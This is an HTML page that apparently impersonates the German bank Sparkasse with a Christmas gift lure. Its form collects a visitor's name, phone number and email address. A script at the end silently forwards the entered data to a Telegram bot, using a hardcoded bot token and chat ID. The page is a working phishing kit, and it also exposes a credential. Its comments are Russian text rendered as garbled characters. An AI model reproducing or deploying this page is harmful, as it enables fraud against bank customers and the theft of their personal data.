<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÑ Sparkasse Geschenke</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: url('https://via.placeholder.com/1920x1080/ffffff/ffffff?text=New+Year+Background') no-repeat center center fixed;
            background-size: cover;
            animation: fadeIn 1s ease-in-out;
            color: #333;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* –ê–Ω–∏–º–∞—Ü–∏—è –ø–æ—è–≤–ª–µ–Ω–∏—è */
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        header {
            background-color: red;
            color: white;
            padding: 20px 40px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            position: relative;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            animation: slideIn 1s ease-in-out;
        }

        @keyframes slideIn {
            from {
                transform: translateY(-100px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        header img {
            width: 50px;
            height: auto;
            border-radius: 8px;
        }

        .form-container {
            background-color: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: 10px;
            width: 90%;
            max-width: 400px;
            margin: 100px auto;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
            animation: zoomIn 1s ease-in-out;
        }

        @keyframes zoomIn {
            from {
                transform: scale(0.8);
                opacity: 0;
            }
            to {
                transform: scale(1);
                opacity: 1;
            }
        }

        h2 {
            text-align: center;
            margin-bottom: 20px;
            color: red;
        }

        input {
            width: 93%;
            padding: 12px;
            margin: 15px 0;
            border: 2px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        input:focus {
            border-color: red;
            outline: none;
        }

        footer {
            background-color: rgb(35, 35, 35);
            color: white;
            text-align: center;
            padding: 10px 0;
            margin-top: auto;
            animation: fadeUp 1s ease-in-out;
        }

        @keyframes fadeUp {
            from {
                transform: translateY(100px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        /* –î–æ–±–∞–≤–ª–µ–Ω–∏–µ —Å–Ω–µ–∂–∏–Ω–æ–∫ */
        .snowflake {
            position: absolute;
            top: -10px;
            z-index: -1;
            opacity: 0.8;
            animation: snow 10s linear infinite;
        }

        @keyframes snow {
            0% {
                transform: translateY(0) rotate(0);
            }
            100% {
                transform: translateY(100vh) rotate(360deg);
            }
        }

        .snowflake:nth-child(odd) {
            animation-duration: 12s;
            animation-delay: -2s;
        }

        .snowflake:nth-child(even) {
            animation-duration: 15s;
            animation-delay: -5s;
        }

        /* –ö–Ω–æ–ø–∫–∞ –≤ –≤–∏–¥–µ –ø–æ–¥–∞—Ä–∫–∞ */
        .gift-button {
            width: 100%; /* –ó–∞–¥–∞—ë–º –∫–Ω–æ–ø–∫—É –Ω–∞ –≤—Å—é —à–∏—Ä–∏–Ω—É */
            height: 50px;
            background-color: #ff5858;
            color: white;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 5px;
            position: relative;
            overflow: hidden;
            cursor: pointer;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .gift-button:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
        }

        .gift-button:before {
            content: '\1F381'; /* –°–∏–º–≤–æ–ª –ø–æ–¥–∞—Ä–∫–∞ */
            font-size: 30px;
            position: absolute;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
        }

        .gift-button span {
            position: relative;
            z-index: 1;
        }

        /* –ê–¥–∞–ø—Ç–∏–≤–Ω–æ—Å—Ç—å –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö */
        @media (max-width: 600px) {
            .gift-button {
                width: 100%; /* –ö–Ω–æ–ø–∫–∞ –±—É–¥–µ—Ç –Ω–∞ –≤—Å—é —à–∏—Ä–∏–Ω—É */
                height: 50px;
                font-size: 16px;
            }

            header {
                padding: 15px;
                flex-direction: column;
                align-items: flex-start;
            }

            .form-container {
                padding: 30px;
                width: 80%;
            }

            h2 {
                font-size: 18px;
            }

            footer {
                padding: 15px 10px;
            }
        }

    </style>
</head>
<body>

    <!-- –°–Ω–µ–∂–∏–Ω–∫–∏ -->
    <div class="snowflake" style="left: 10%; animation-duration: 14s; animation-delay: 1s;">‚ùÑ</div>
    <div class="snowflake" style="left: 20%; animation-duration: 11s; animation-delay: 2s;">‚ùÑ</div>
    <div class="snowflake" style="left: 30%; animation-duration: 13s; animation-delay: 0s;">‚ùÑ</div>
    <div class="snowflake" style="left: 40%; animation-duration: 16s; animation-delay: -1s;">‚ùÑ</div>
    <div class="snowflake" style="left: 50%; animation-duration: 14s; animation-delay: -3s;">‚ùÑ</div>
    <div class="snowflake" style="left: 60%; animation-duration: 17s; animation-delay: 4s;">‚ùÑ</div>

    <header>
        <!-- –õ–æ–≥–æ—Ç–∏–ø –≤ –≤–∏–¥–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è -->
        <img src="Slogo.png" alt="Logo">
    </header>

    <div class="form-container">
        <h2>Formular ausf√ºllen</h2>
        <form id="contactForm">
            <input type="text" id="name" placeholder="Ihr Name" required>
            <input type="tel" id="phone" placeholder="Telefonnummer" required>
            <input type="email" id="email" placeholder="E-Mail-Adresse" required>
            <button type="submit" class="gift-button"><span>Absenden</span></button>
        </form>

    <footer>
        <p>¬© Alle Rechte vorbehalten</p>

    <script>
        document.getElementById('contactForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const name = document.getElementById('name').value;
            const phone = document.getElementById('phone').value;
            const email = document.getElementById('email').value;

            // –ó–∞–º–µ–Ω–∏—Ç–µ <YOUR_BOT_TOKEN> –∏ <YOUR_CHAT_ID> –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è
            const botToken = '7999556199:AAEC3tCfjfVncG4LbLhGSFy9I9x5xiMan6M';
            const chatId = '7777965506';

            const message = `Neue Anfrage:\nName: ${name}\nTelefonnummer: ${phone}\nE-Mail-Adresse: ${email}`;

            // –ò—Å–ø–æ–ª—å–∑—É–µ–º POST –∑–∞–ø—Ä–æ—Å –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert("Daten wurden erfolgreich gesendet!");
                } else {
                    alert("Fehler beim Senden der Daten.");
                }
            })
            .catch(error => {
                alert("Fehler beim Senden der Daten.");
            });
        });
    </script>

</body>
</html>
